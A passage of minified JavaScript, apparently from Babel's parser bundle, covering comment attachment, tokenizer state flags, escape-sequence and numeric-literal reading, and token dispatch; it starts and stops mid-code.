G=this.scopeStack[Y].tsNames.get(Q);if((G&1)>0||(G&16)>0)return}super.checkLocalExport(X)}}class vq{constructor(){this.stacks=[]}enter(X){this.stacks.push(X)}exit(){this.stacks.pop()}currentFlags(){return this.stacks[this.stacks.length-1]}get hasAwait(){return(this.currentFlags()&2)>0}get hasYield(){return(this.currentFlags()&1)>0}get hasReturn(){return(this.currentFlags()&4)>0}get hasIn(){return(this.currentFlags()&8)>0}}function nJ(X,Q){return(X?2:0)|(Q?1:0)}class xq{constructor(){this.sawUnambiguousESM=!1,this.ambiguousScriptDifferentAst=!1}sourceToOffsetPos(X){return X+this.startIndex}offsetToSourcePos(X){return X-this.startIndex}hasPlugin(X){if(typeof X==="string")return this.plugins.has(X);else{let[Q,J]=X;if(!this.hasPlugin(Q))return!1;let Y=this.plugins.get(Q);for(let W of Object.keys(J))if((Y==null?void 0:Y[W])!==J[W])return!1;return!0}}getPluginOption(X,Q){var J;return(J=this.plugins.get(X))==null?void 0:J[Q]}}function fq(X,Q){if(X.trailingComments===void 0)X.trailingComments=Q;else X.trailingComments.unshift(...Q)}function vv(X,Q){if(X.leadingComments===void 0)X.leadingComments=Q;else X.leadingComments.unshift(...Q)}function _4(X,Q){if(X.innerComments===void 0)X.innerComments=Q;else X.innerComments.unshift(...Q)}function KX(X,Q,J){let Y=null,W=Q.length;while(Y===null&&W>0)Y=Q[--W];if(Y===null||Y.start>J.start)_4(X,J.comments);else fq(Y,J.comments)}class hq extends xq{addComment(X){if(this.filename)X.loc.filename=this.filename;let{commentsLen:Q}=this.state;if(this.comments.length!==Q)this.comments.length=Q;this.comments.push(X),this.state.commentsLen++}processComment(X){let{commentStack:Q}=this.state,J=Q.length;if(J===0)return;let Y=J-1,W=Q[Y];if(W.start===X.end)W.leadingNode=X,Y--;let{start:G}=X;for(;Y>=0;Y--){let H=Q[Y],$=H.end;if($>G)H.containingNode=X,this.finalizeComment(H),Q.splice(Y,1);else{if($===G)H.trailingNode=X;break}}}finalizeComment(X){var Q;let{comments:J}=X;if(X.leadingNode!==null||X.trailingNode!==null){if(X.leadingNode!==null)fq(X.leadingNode,J);if(X.trailingNode!==null)vv(X.trailingNode,J)}else{let{containingNode:Y,start:W}=X;if(this.input.charCodeAt(this.offsetToSourcePos(W)-1)===44)switch(Y.type){case"ObjectExpression":case"ObjectPattern":case"RecordExpression":KX(Y,Y.properties,X);break;case"CallExpression":case"OptionalCallExpression":KX(Y,Y.arguments,X);break;case"ImportExpression":KX(Y,[Y.source,(Q=Y.options)!=null?Q:null],X);break;case"FunctionDeclaration":case"FunctionExpression":case"ArrowFunctionExpression":case"ObjectMethod":case"ClassMethod":case"ClassPrivateMethod":KX(Y,Y.params,X);break;case"ArrayExpression":case"ArrayPattern":case"TupleExpression":KX(Y,Y.elements,X);break;case"ExportNamedDeclaration":case"ImportDeclaration":KX(Y,Y.specifiers,X);break;case"TSEnumDeclaration":KX(Y,Y.members,X);break;case"TSEnumBody":KX(Y,Y.members,X);break;default:_4(Y,J)}else _4(Y,J)}}finalizeRemainingComments(){let{commentStack:X}=this.state;for(let Q=X.length-1;Q>=0;Q--)this.finalizeComment(X[Q]);this.state.commentStack=[]}resetPreviousNodeTrailingComments(X){let{commentStack:Q}=this.state,{length:J}=Q;if(J===0)return;let Y=Q[J-1];if(Y.leadingNode===X)Y.leadingNode=null}takeSurroundingComments(X,Q,J){let{commentStack:Y}=this.state,W=Y.length;if(W===0)return;let G=W-1;for(;G>=0;G--){let H=Y[G],$=H.end;if(H.start===J)H.leadingNode=X;else if($===Q)H.trailingNode=X;else if($<Q)break}}}class bH{constructor(){this.flags=1024,this.startIndex=void 0,this.curLine=void 0,this.lineStart=void 0,this.startLoc=void 0,this.endLoc=void 0,this.errors=[],this.potentialArrowAt=-1,this.noArrowAt=[],this.noArrowParamsConversionAt=[],this.topicContext={maxNumOfResolvableTopics:0,maxTopicIndex:null},this.labels=[],this.commentsLen=0,this.commentStack=[],this.pos=0,this.type=140,this.value=null,this.start=0,this.end=0,this.lastTokEndLoc=null,this.lastTokStartLoc=null,this.context=[L0.brace],this.firstInvalidTemplateEscapePos=null,this.strictErrors=new Map,this.tokensLength=0}get strict(){return(this.flags&1)>0}set strict(X){if(X)this.flags|=1;else this.flags&=-2}init({strictMode:X,sourceType:Q,startIndex:J,startLine:Y,startColumn:W}){this.strict=X===!1?!1:X===!0?!0:Q==="module",this.startIndex=J,this.curLine=Y,this.lineStart=-W,this.startLoc=this.endLoc=new C8(Y,W,J)}get maybeInArrowParameters(){return(this.flags&2)>0}set maybeInArrowParameters(X){if(X)this.flags|=2;else this.flags&=-3}get inType(){return(this.flags&4)>0}set inType(X){if(X)this.flags|=4;else this.flags&=-5}get noAnonFunctionType(){return(this.flags&8)>0}set noAnonFunctionType(X){if(X)this.flags|=8;else this.flags&=-9}get hasFlowComment(){return(this.flags&16)>0}set hasFlowComment(X){if(X)this.flags|=16;else this.flags&=-17}get isAmbientContext(){return(this.flags&32)>0}set isAmbientContext(X){if(X)this.flags|=32;else this.flags&=-33}get inAbstractClass(){return(this.flags&64)>0}set inAbstractClass(X){if(X)this.flags|=64;else this.flags&=-65}get inDisallowConditionalTypesContext(){return(this.flags&128)>0}set inDisallowConditionalTypesContext(X){if(X)this.flags|=128;else this.flags&=-129}get soloAwait(){return(this.flags&256)>0}set soloAwait(X){if(X)this.flags|=256;else this.flags&=-257}get inFSharpPipelineDirectBody(){return(this.flags&512)>0}set inFSharpPipelineDirectBody(X){if(X)this.flags|=512;else this.flags&=-513}get canStartJSXElement(){return(this.flags&1024)>0}set canStartJSXElement(X){if(X)this.flags|=1024;else this.flags&=-1025}get containsEsc(){return(this.flags&2048)>0}set containsEsc(X){if(X)this.flags|=2048;else this.flags&=-2049}get hasTopLevelAwait(){return(this.flags&4096)>0}set hasTopLevelAwait(X){if(X)this.flags|=4096;else this.flags&=-4097}curPosition(){return new C8(this.curLine,this.pos-this.lineStart,this.pos+this.startIndex)}clone(){let X=new bH;return X.flags=this.flags,X.startIndex=this.startIndex,X.curLine=this.curLine,X.lineStart=this.lineStart,X.startLoc=this.startLoc,X.endLoc=this.endLoc,X.errors=this.errors.slice(),X.potentialArrowAt=this.potentialArrowAt,X.noArrowAt=this.noArrowAt.slice(),X.noArrowParamsConversionAt=this.noArrowParamsConversionAt.slice(),X.topicContext=this.topicContext,X.labels=this.labels.slice(),X.commentsLen=this.commentsLen,X.commentStack=this.commentStack.slice(),X.pos=this.pos,X.type=this.type,X.value=this.value,X.start=this.start,X.end=this.end,X.lastTokEndLoc=this.lastTokEndLoc,X.lastTokStartLoc=this.lastTokStartLoc,X.context=this.context.slice(),X.firstInvalidTemplateEscapePos=this.firstInvalidTemplateEscapePos,X.strictErrors=this.strictErrors,X.tokensLength=this.tokensLength,X}}var xv=function(Q){return Q>=48&&Q<=57},Mq={decBinOct:new Set([46,66,69,79,95,98,101,111]),hex:new Set([46,88,95,120])},dJ={bin:(X)=>X===48||X===49,oct:(X)=>X>=48&&X<=55,dec:(X)=>X>=48&&X<=57,hex:(X)=>X>=48&&X<=57||X>=65&&X<=70||X>=97&&X<=102};function jq(X,Q,J,Y,W,G){let H=J,$=Y,z=W,U="",K=null,B=J,{length:q}=Q;for(;;){if(J>=q){G.unterminated(H,$,z),U+=Q.slice(B,J);break}let Z=Q.charCodeAt(J);if(fv(X,Z,Q,J)){U+=Q.slice(B,J);break}if(Z===92){U+=Q.slice(B,J);let M=hv(Q,J,Y,W,X==="template",G);if(M.ch===null&&!K)K={pos:J,lineStart:Y,curLine:W};else U+=M.ch;({pos:J,lineStart:Y,curLine:W}=M),B=J}else if(Z===8232||Z===8233)++J,++W,Y=J;else if(Z===10||Z===13)if(X==="template"){if(U+=Q.slice(B,J)+`
`,++J,Z===13&&Q.charCodeAt(J)===10)++J;++W,B=Y=J}else G.unterminated(H,$,z);else++J}return{pos:J,str:U,firstInvalidLoc:K,lineStart:Y,curLine:W,containsInvalid:!!K}}function fv(X,Q,J,Y){if(X==="template")return Q===96||Q===36&&J.charCodeAt(Y+1)===123;return Q===(X==="double"?34:39)}function hv(X,Q,J,Y,W,G){let H=!W;Q++;let $=(U)=>({pos:Q,ch:U,lineStart:J,curLine:Y}),z=X.charCodeAt(Q++);switch(z){case 110:return $(`
`);case 114:return $("\r");case 120:{let U;return{code:U,pos:Q}=LH(X,Q,J,Y,2,!1,H,G),$(U===null?null:String.fromCharCode(U))}case 117:{let U;return{code:U,pos:Q}=gq(X,Q,J,Y,H,G),$(U===null?null:String.fromCodePoint(U))}case 116:return $("\t");case 98:return $("\b");case 118:return $("\v");case 102:return $("\f");case 13:if(X.charCodeAt(Q)===10)++Q;case 10:J=Q,++Y;case 8232:case 8233:return $("");case 56:case 57:if(W)return $(null);else G.strictNumericEscape(Q-1,J,Y);default:if(z>=48&&z<=55){let U=Q-1,B=/^[0-7]+/.exec(X.slice(U,Q+2))[0],q=parseInt(B,8);if(q>255)B=B.slice(0,-1),q=parseInt(B,8);Q+=B.length-1;let Z=X.charCodeAt(Q);if(B!=="0"||Z===56||Z===57)if(W)return $(null);else G.strictNumericEscape(U,J,Y);return $(String.fromCharCode(q))}return $(String.fromCharCode(z))}}function LH(X,Q,J,Y,W,G,H,$){let z=Q,U;if({n:U,pos:Q}=yq(X,Q,J,Y,16,W,G,!1,$,!H),U===null)if(H)$.invalidEscapeSequence(z,J,Y);else Q=z-1;return{code:U,pos:Q}}function yq(X,Q,J,Y,W,G,H,$,z,U){let K=Q,B=W===16?Mq.hex:Mq.decBinOct,q=W===16?dJ.hex:W===10?dJ.dec:W===8?dJ.oct:dJ.bin,Z=!1,M=0;for(let L=0,R=G==null?1/0:G;L<R;++L){let j=X.charCodeAt(Q),F;if(j===95&&$!=="bail"){let A=X.charCodeAt(Q-1),O=X.charCodeAt(Q+1);if(!$){if(U)return{n:null,pos:Q};z.numericSeparatorInEscapeSequence(Q,J,Y)}else if(Number.isNaN(O)||!q(O)||B.has(A)||B.has(O)){if(U)return{n:null,pos:Q};z.unexpectedNumericSeparator(Q,J,Y)}++Q;continue}if(j>=97)F=j-97+10;else if(j>=65)F=j-65+10;else if(xv(j))F=j-48;else F=1/0;if(F>=W)if(F<=9&&U)return{n:null,pos:Q};else if(F<=9&&z.invalidDigit(Q,J,Y,W))F=0;else if(H)F=0,Z=!0;else break;++Q,M=M*W+F}if(Q===K||G!=null&&Q-K!==G||Z)return{n:null,pos:Q};return{n:M,pos:Q}}function gq(X,Q,J,Y,W,G){let H=X.charCodeAt(Q),$;if(H===123){if(++Q,{code:$,pos:Q}=LH(X,Q,J,Y,X.indexOf("}",Q)-Q,!0,W,G),++Q,$!==null&&$>1114111)if(W)G.invalidCodePoint(Q,J,Y);else return{code:null,pos:Q}}else({code:$,pos:Q}=LH(X,Q,J,Y,4,!1,W,G));return{code:$,pos:Q}}function I4(X,Q,J){return new C8(J,X-Q,X)}var yv=new Set([103,109,115,105,121,117,100,118]);class N8{constructor(X){let Q=X.startIndex||0;this.type=X.type,this.value=X.value,this.start=Q+X.start,this.end=Q+X.end,this.loc=new T4(X.startLoc,X.endLoc)}}class mq extends hq{constructor(X,Q){super();this.isLookahead=void 0,this.tokens=[],this.errorHandlers_readInt={invalidDigit:(J,Y,W,G)=>{if(!(this.optionFlags&2048))return!1;return this.raise(x.InvalidDigit,I4(J,Y,W),{radix:G}),!0},numericSeparatorInEscapeSequence:this.errorBuilder(x.NumericSeparatorInEscapeSequence),unexpectedNumericSeparator:this.errorBuilder(x.UnexpectedNumericSeparator)},this.errorHandlers_readCodePoint=Object.assign({},this.errorHandlers_readInt,{invalidEscapeSequence:this.errorBuilder(x.InvalidEscapeSequence),invalidCodePoint:this.errorBuilder(x.InvalidCodePoint)}),this.errorHandlers_readStringContents_string=Object.assign({},this.errorHandlers_readCodePoint,{strictNumericEscape:(J,Y,W)=>{this.recordStrictModeErrors(x.StrictNumericEscape,I4(J,Y,W))},unterminated:(J,Y,W)=>{throw this.raise(x.UnterminatedString,I4(J-1,Y,W))}}),this.errorHandlers_readStringContents_template=Object.assign({},this.errorHandlers_readCodePoint,{strictNumericEscape:this.errorBuilder(x.StrictNumericEscape),unterminated:(J,Y,W)=>{throw this.raise(x.UnterminatedTemplate,I4(J,Y,W))}}),this.state=new bH,this.state.init(X),this.input=Q,this.length=Q.length,this.comments=[],this.isLookahead=!1}pushToken(X){this.tokens.length=this.state.tokensLength,this.tokens.push(X),++this.state.tokensLength}next(){if(this.checkKeywordEscapes(),this.optionFlags&256)this.pushToken(new N8(this.state));this.state.lastTokEndLoc=this.state.endLoc,this.state.lastTokStartLoc=this.state.startLoc,this.nextToken()}eat(X){if(this.match(X))return this.next(),!0;else return!1}match(X){return this.state.type===X}createLookaheadState(X){return{pos:X.pos,value:null,type:X.type,start:X.start,end:X.end,context:[this.curContext()],inType:X.inType,startLoc:X.startLoc,lastTokEndLoc:X.lastTokEndLoc,curLine:X.curLine,lineStart:X.lineStart,curPosition:X.curPosition}}lookahead(){let X=this.state;this.state=this.createLookaheadState(X),this.isLookahead=!0,this.nextToken(),this.isLookahead=!1;let Q=this.state;return this.state=X,Q}nextTokenStart(){return this.nextTokenStartSince(this.state.pos)}nextTokenStartSince(X){return jH.lastIndex=X,jH.test(this.input)?jH.lastIndex:X}lookaheadCharCode(){return this.lookaheadCharCodeSince(this.state.pos)}lookaheadCharCodeSince(X){return this.input.charCodeAt(this.nextTokenStartSince(X))}nextTokenInLineStart(){return this.nextTokenInLineStartSince(this.state.pos)}nextTokenInLineStartSince(X){return FH.lastIndex=X,FH.test(this.input)?FH.lastIndex:X}lookaheadInLineCharCode(){return this.input.charCodeAt(this.nextTokenInLineStart())}codePointAtPos(X){let Q=this.input.charCodeAt(X);if((Q&64512)===55296&&++X<this.input.length){let J=this.input.charCodeAt(X);if((J&64512)===56320)Q=65536+((Q&1023)<<10)+(J&1023)}return Q}setStrict(X){if(this.state.strict=X,X)this.state.strictErrors.forEach(([Q,J])=>this.raise(Q,J)),this.state.strictErrors.clear()}curContext(){return this.state.context[this.state.context.length-1]}nextToken(){if(this.skipSpace(),this.state.start=this.state.pos,!this.isLookahead)this.state.startLoc=this.state.curPosition();if(this.state.pos>=this.length){this.finishToken(140);return}this.getTokenFromCode(this.codePointAtPos(this.state.pos))}skipBlockComment(X){let Q;if(!this.isLookahead)Q=this.state.curPosition();let J=this.state.pos,Y=this.input.indexOf(X,J+2);if(Y===-1)throw this.raise(x.UnterminatedComment,this.state.curPosition());this.state.pos=Y+X.length,pJ.lastIndex=J+2;while(pJ.test(this.input)&&pJ.lastIndex<=Y)++this.state.curLine,this.state.lineStart=pJ.lastIndex;if(this.isLookahead)return;let W={type:"CommentBlock",value:this.input.slice(J+2,Y),start:this.sourceToOffsetPos(J),end:this.sourceToOffsetPos(Y+X.length),loc:new T4(Q,this.state.curPosition())};if(this.optionFlags&256)this.pushToken(W);return W}skipLineComment(X){let Q=this.state.pos,J;if(!this.isLookahead)J=this.state.curPosition();let Y=this.input.charCodeAt(this.state.pos+=X);if(this.state.pos<this.length)while(!Q5(Y)&&++this.state.pos<this.length)Y=this.input.charCodeAt(this.state.pos);if(this.isLookahead)return;let W=this.state.pos,H={type:"CommentLine",value:this.input.slice(Q+X,W),start:this.sourceToOffsetPos(Q),end:this.sourceToOffsetPos(W),loc:new T4(J,this.state.curPosition())};if(this.optionFlags&256)this.pushToken(H);return H}skipSpace(){let X=this.state.pos,Q=this.optionFlags&4096?[]:null;X:while(this.state.pos<this.length){let J=this.input.charCodeAt(this.state.pos);switch(J){case 32:case 160:case 9:++this.state.pos;break;case 13:if(this.input.charCodeAt(this.state.pos+1)===10)++this.state.pos;case 10:case 8232:case 8233:++this.state.pos,++this.state.curLine,this.state.lineStart=this.state.pos;break;case 47:switch(this.input.charCodeAt(this.state.pos+1)){case 42:{let Y=this.skipBlockComment("*/");if(Y!==void 0)this.addComment(Y),Q==null||Q.push(Y);break}case 47:{let Y=this.skipLineComment(2);if(Y!==void 0)this.addComment(Y),Q==null||Q.push(Y);break}default:break X}break;default:if(kv(J))++this.state.pos;else if(J===45&&!this.inModule&&this.optionFlags&8192){let Y=this.state.pos;if(this.input.charCodeAt(Y+1)===45&&this.input.charCodeAt(Y+2)===62&&(X===0||this.state.lineStart>X)){let W=this.skipLineComment(3);if(W!==void 0)this.addComment(W),Q==null||Q.push(W)}else break X}else if(J===60&&!this.inModule&&this.optionFlags&8192){let Y=this.state.pos;if(this.input.charCodeAt(Y+1)===33&&this.input.charCodeAt(Y+2)===45&&this.input.charCodeAt(Y+3)===45){let W=this.skipLineComment(4);if(W!==void 0)this.addComment(W),Q==null||Q.push(W)}else break X}else break X}}if((Q==null?void 0:Q.length)>0){let J=this.state.pos,Y={start:this.sourceToOffsetPos(X),end:this.sourceToOffsetPos(J),comments:Q,leadingNode:null,trailingNode:null,containingNode:null};this.state.commentStack.push(Y)}}finishToken(X,Q){this.state.end=this.state.pos,this.state.endLoc=this.state.curPosition();let J=this.state.type;if(this.state.type=X,this.state.value=Q,!this.isLookahead)this.updateContext(J)}replaceToken(X){this.state.type=X,this.updateContext()}readToken_numberSign(){if(this.state.pos===0&&this.readToken_interpreter())return;let X=this.state.pos+1,Q=this.codePointAtPos(X);if(Q>=48&&Q<=57)throw this.raise(x.UnexpectedDigitAfterHash,this.state.curPosition());if(Q===123||Q===91&&this.hasPlugin("recordAndTuple")){if(this.expectPlugin("recordAndTuple"),this.getPluginOption("recordAndTuple","syntaxType")==="bar")throw this.raise(Q===123?x.RecordExpressionHashIncorrectStartSyntaxType:x.TupleExpressionHashIncorrectStartSyntaxType,this.state.curPosition());if(this.state.pos+=2,Q===123)this.finishToken(7);else this.finishToken(1)}else if(I8(Q))++this.state.pos,this.finishToken(139,this.readWord1(Q));else if(Q===92)++this.state.pos,this.finishToken(139,this.readWord1());else this.finishOp(27,1)}readToken_dot(){let X=this.input.charCodeAt(this.state.pos+1);if(X>=48&&X<=57){this.readNumber(!0);return}if(X===46&&this.input.charCodeAt(this.state.pos+2)===46)this.state.pos+=3,this.finishToken(21);else++this.state.pos,this.finishToken(16)}readToken_slash(){if(this.input.charCodeAt(this.state.pos+1)===61)this.finishOp(31,2);else this.finishOp(56,1)}readToken_interpreter(){if(this.state.pos!==0||this.length<2)return!1;let X=this.input.charCodeAt(this.state.pos+1);if(X!==33)return!1;let Q=this.state.pos;this.state.pos+=1;while(!Q5(X)&&++this.state.pos<this.length)X=this.input.charCodeAt(this.state.pos);let J=this.input.slice(Q+2,this.state.pos);return this.finishToken(28,J),!0}readToken_mult_modulo(X){let Q=X===42?55:54,J=1,Y=this.input.charCodeAt(this.state.pos+1);if(X===42&&Y===42)J++,Y=this.input.charCodeAt(this.state.pos+2),Q=57;if(Y===61&&!this.state.inType)J++,Q=X===37?33:30;this.finishOp(Q,J)}readToken_pipe_amp(X){let Q=this.input.charCodeAt(this.state.pos+1);if(Q===X){if(this.input.charCodeAt(this.state.pos+2)===61)this.finishOp(30,3);else this.finishOp(X===124?41:42,2);return}if(X===124){if(Q===62){this.finishOp(39,2);return}if(this.hasPlugin("recordAndTuple")&&Q===125){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(x.RecordExpressionBarIncorrectEndSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(9);return}if(this.hasPlugin("recordAndTuple")&&Q===93){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(x.TupleExpressionBarIncorrectEndSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(4);return}}if(Q===61){this.finishOp(30,2);return}this.finishOp(X===124?43:45,1)}readToken_caret(){let X=this.input.charCodeAt(this.state.pos+1);if(X===61&&!this.state.inType)this.finishOp(32,2);else if(X===94&&this.hasPlugin(["pipelineOperator",{proposal:"hack",topicToken:"^^"}])){if(this.finishOp(37,2),this.input.codePointAt(this.state.pos)===94)this.unexpected()}else this.finishOp(44,1)}readToken_atSign(){if(this.input.charCodeAt(this.state.pos+1)===64&&this.hasPlugin(["pipelineOperator",{proposal:"hack",topicToken:"@@"}]))this.finishOp(38,2);else this.finishOp(26,1)}readToken_plus_min(X){let Q=this.input.charCodeAt(this.state.pos+1);if(Q===X){this.finishOp(34,2);return}if(Q===61)this.finishOp(30,2);else this.finishOp(53,1)}readToken_lt(){let{pos:X}=this.state,Q=this.input.charCodeAt(X+1);if(Q===60){if(this.input.charCodeAt(X+2)===61){this.finishOp(30,3);return}this.finishOp(51,2);return}if(Q===61){this.finishOp(49,2);return}this.finishOp(47,1)}readToken_gt(){let{pos:X}=this.state,Q=this.input.charCodeAt(X+1);if(Q===62){let J=this.input.charCodeAt(X+2)===62?3:2;if(this.input.charCodeAt(X+J)===61){this.finishOp(30,J+1);return}this.finishOp(52,J);return}if(Q===61){this.finishOp(49,2);return}this.finishOp(48,1)}readToken_eq_excl(X){let Q=this.input.charCodeAt(this.state.pos+1);if(Q===61){this.finishOp(46,this.input.charCodeAt(this.state.pos+2)===61?3:2);return}if(X===61&&Q===62){this.state.pos+=2,this.finishToken(19);return}this.finishOp(X===61?29:35,1)}readToken_question(){let X=this.input.charCodeAt(this.state.pos+1),Q=this.input.charCodeAt(this.state.pos+2);if(X===63)if(Q===61)this.finishOp(30,3);else this.finishOp(40,2);else if(X===46&&!(Q>=48&&Q<=57))this.state.pos+=2,this.finishToken(18);else++this.state.pos,this.finishToken(17)}getTokenFromCode(X){switch(X){case 46:this.readToken_dot();return;case 40:++this.state.pos,this.finishToken(10);return;case 41:++this.state.pos,this.finishToken(11);return;case 59:++this.state.pos,this.finishToken(13);return;case 44:++this.state.pos,this.finishToken(12);return;case 91:if(this.hasPlugin("recordAndTuple")&&this.input.charCodeAt(this.state.pos+1)===124){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(x.TupleExpressionBarIncorrectStartSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(2)}else++this.state.pos,this.finishToken(0);return;case 93:++this.state.pos,this.finishToken(3);return;case 123:if(this.hasPlugin("recordAndTuple")&&this.input.charCodeAt(this.state.pos+1)===124){if(this.getPluginOption("recordAndTuple","syntaxType")!=="bar")throw this.raise(x.RecordExpressionBarIncorrectStartSyntaxType,this.state.curPosition());this.state.pos+=2,this.finishToken(6)}else++this.state.pos,this.finishToken(5);return;case 125:++this.state.pos,this.finishToken(8);return;case 58:if(this.hasPlugin("functionBind")&&this.input.charCodeAt(this.state.pos+1)===58)this.finishOp(15,2);else++this.state.pos,this.finishToken(14);return;case 63:this.readToken_question();return;case 96:this.readTemplateToken();return;case 48:{let Q=this.input.charCodeAt(this.state.pos+1);if(Q===120||Q===88){this.readRadixNumber(16);return}if(Q===111||Q===79){this.readRadixNumber(8);return}if(Q===98||Q===66){this.readRadixNumber(2);return}}case 49:case 50:case 51:case 52:case 53:case 54:case 55:case 56:case 57:this.readNumber(!1);return;case 34:case 39:this.readString(X);return;case 47:this.readToken_slash();return;case 37:case 42:this.readToken_mult_modulo(X);return;case 124:case 38:this.readToken_pipe_amp(X);return;case 94:this.readToken_caret();return;case 43:case 45:this.readToken_plus_min(X);return;case 60:this.readToken_lt();return;case 62:this.readToken_gt();return;case 61:case 33:this.readToken_eq_excl(X);return;case 126:this.finishOp(36,1);return;case 64:this.readToken_atSign();return;case 35:this.readToken_numberSign();return;case 92:this.readWord();return;default:if(I8(X)){this.readWord(X);return}}throw this.raise(x.InvalidOrUnexpectedToken,this.state.curPosition(),{unexpected:String.fromCodePoint(X)})}finishOp(X,Q){let J=this.input.slice(this.state.pos,this.state.pos+Q);this.state.pos+=Q,this.finishToken(X,J)}readRegexp(){let X=this.state.startLoc,Q=this.state.start+1,J,Y,{pos:W}=this.state;for(;;++W){if(W>=this.length)throw this.raise(x.UnterminatedRegExp,C9(X,1));let z=this.input.charCodeAt(W);if(Q5(z))throw this.raise(x.UnterminatedRegExp,C9(X,1));if(J)J=!1;else{if(z===91)Y=!0;else if(z===93&&Y)Y=!1;else if(z===47&&!Y)break;J=z===92}}let G=this.input.slice(Q,W);++W;let H="",$=()=>C9(X,W+2-Q);while(W<this.length){let z=this.codePointAtPos(W),U=String.fromCharCode(z);if(yv.has(z)){if(z===118){if(H.includes("u"))this.raise(x.IncompatibleRegExpUVFlags,$())}else if(z===117){if(H.includes("v"))this.raise(x.IncompatibleRegExpUVFlags,$())}if(H.includes(U))this.raise(x.DuplicateRegExpFlags,$())}else if(X5(z)||z===92)this.raise(x.MalformedRegExpFlags,$());else break;++W,H+=U}this.state.pos=W,this.finishToken(138,{pattern:G,flags:H})}readInt(X,Q,J=!1,Y=!0){let{n:W,pos:G}=yq(this.input,this.state.pos,this.state.lineStart,this.state.curLine,X,Q,J,Y,this.errorHandlers_readInt,!1);return this.state.pos=G,W}readRadixNumber(X){let Q=this.state.pos,J=this.state.curPosition(),Y=!1;this.state.pos+=2;let W=this.readInt(X);if(W==null)this.raise(x.InvalidDigit,C9(J,2),{radix:X});let G=this.input.charCodeAt(this.state.pos);if(G===110)++this.state.pos,Y=!0;else if(G===109)throw this.raise(x.InvalidDecimal,J);if(I8(this.codePointAtPos(this.state.pos)))throw this.raise(x.NumberIdentifier,this.state.curPosition());if(Y){let H=this.input.slice(Q,this.state.pos).replace(/[_n]/g,"");this.finishToken(136,H);return}this.finishToken(135,W)}readNumber(X){let Q=this.state.pos,J=this.state.curPosition(),Y=!1,W=!1,G=!1,H=!1;if(!X&&this.readInt(10)===null)this.raise(x.InvalidNumber,this.state.curPosition());let $=this.state.pos-Q>=2&&this.input.charCodeAt(Q)===48;if($){let q=this.input.slice(Q,this.state.pos);if(this.recordStrictModeErrors(x.StrictOctalLiteral,J),!this.state.strict){let Z=q.indexOf("_");if(Z>0)this.raise(x.ZeroDigitNumericSeparator,C9(J,Z))}H=$&&!/[89]/.test(q)}let z=this.input.charCodeAt(this.state.pos);if(z===46&&!H)++this.state.pos,this.readInt(10),Y=!0,z=this.input.charCodeAt(this.state.pos);if((z===69||z===101)&&!H){if(z=this.input.charCodeAt(++this.state.pos),z===43||z===45)++this.state.pos;if(this.readInt(10)===null)this.raise(x.InvalidOrMissingExponent,J);Y=!0,G=!0,z=this.input.charCodeAt(this.state.pos)}if(z===110){if(Y||$)this.raise(x.InvalidBigIntLiteral,J);++this.state.pos,W=!0}if(z===109){if(this.expectPlugin("decimal",this.state.curPosition()),G||$)this.raise(x.InvalidDecimal,J);++this.state.pos;var U=!0}if(I8(this.codePointAtPos(this.state.pos)))throw this.raise(x.NumberIdentifier,this.state.curPosition());let K=this.input.slice(Q,this.state.pos).replace(/[_mn]/g,"");if(W){this.finishToken(136,K);return}if(U){this.finishToken(137,K);return}let B=H?parseInt(K,8):parseFloat(K);this.finishToken(135,B)}readCodePoint(X){let{code:Q,pos:J}=gq(this.input,this.state.pos,this.state.lineStart,this.state.curLine,X,this.errorHandlers_readCodePoint);return this.state.pos=J,Q}readString(X){let{str:Q,pos:J,curLine:Y,lineStart:W}=jq(X===34?"double":"single",this.input,this.state.pos+1,this.state.lineStart,this.state.curLine,this.errorHandlers_readStringContents_string);this.state.pos=J+1,this.state.lineStart=W,this.state.curLine=Y,this.finishToken(134,Q)}readTemplateContinuation(){if(!this.match(8))this.unexpected(null,8);this.state.pos--,this.readTemplateToken()}readTemplateToken(){let X=this.input[this.state.pos],{str:Q,firstInvalidLoc:J,pos:Y,curLine:W,lineStart:G}=jq("template",this.input,this.state.pos+1,this.state.lineStart,this.state.curLine,this.errorHandlers_readStringContents_template);if(this.state.pos=Y+1,this.state.lineStart=G,this.state.curLine=W,J)this.state.firstInvalidTemplateEscapePos=new C8(J.curLine,J.pos-J.lineStart,this.sourceToOffsetPos(J.pos));if(this.input.codePointAt(Y)===96)this.finishToken(24,J?null:X+Q+"`");else this.state.pos++,this.finishToken(25,J?null:X+Q+"${")}recordStrictModeErrors(X,Q){let J=Q.index;if(this.state.strict&&!this.state.strictErrors.has(J))this.raise(X,Q);else this.state.strictErrors.set(J,[X,Q])}readWord1(X){this.state.containsEsc=!1;let Q="",J=this.state.pos,Y=this.state.pos;if(X!==void 0)this.state.pos+=X<=65535?1:2;while(this.state.pos<this.length){let W=this.codePointAtPos(this.state.pos);if(X5(W))this.state.pos+=W<=65535?1:2;else if(W===92){this.state.containsEsc=!0,Q+=this.input.slice(Y,this.state.pos);let G=this.state.curPosition(),H=this.state.pos===J?I8:X5;if(this.input.charCodeAt(++this.state.pos)!==117){this.raise(x.MissingUnicodeEscape,this.state.curPosition()),Y=this.state.pos-1;continue}++this.state.pos;let $=this.readCodePoint(!0);if($!==null){if(!H($))this.raise(x.EscapedCharNotAnIdentifier,G);Q+=String.fromCodePoint($)}Y=this.state.pos}else break}return Q+this.input.slice(Y,this.state.pos)}readWord(X){let Q=this.readWord1(X),J=wH.get(Q);if(J!==void 0)this.finishToken(J,VX(J));else this.finishToken(132,Q)}checkKeywordEscapes(){let{type:X}=this.state;if(TH(X)&&this.state.containsEsc)this.raise(x.InvalidEscapedReservedWord,this.state.startLoc,{reservedWord:VX(X)})}raise(X,Q,J={}){let Y=Q instanceof C8?Q:Q.loc.start,W=X(Y,J);if(!(this.optionFlags&2048))throw W;if(!this.isLookahead)this.state.errors.push(W);return W}raiseOverwrite(X,Q,J={}){let Y=Q instanceof C8?Q:Q.loc.start,W=Y.index,G=this.state.errors;for(let H=G.length-1;H>=0;H--){let $=G[H];if($.loc.index===W)return G[H]=X(Y,J);if($.loc.index<W)break}return this.raise(X,Q,J)}updateContext(X){}unexpected(X,Q){throw this.raise(x.UnexpectedToken,X!=null?X:this.state.startLoc,{expected:Q?VX(Q):null})}expectPlugin(X,Q){if(this.hasPlugin(X))return!0;throw 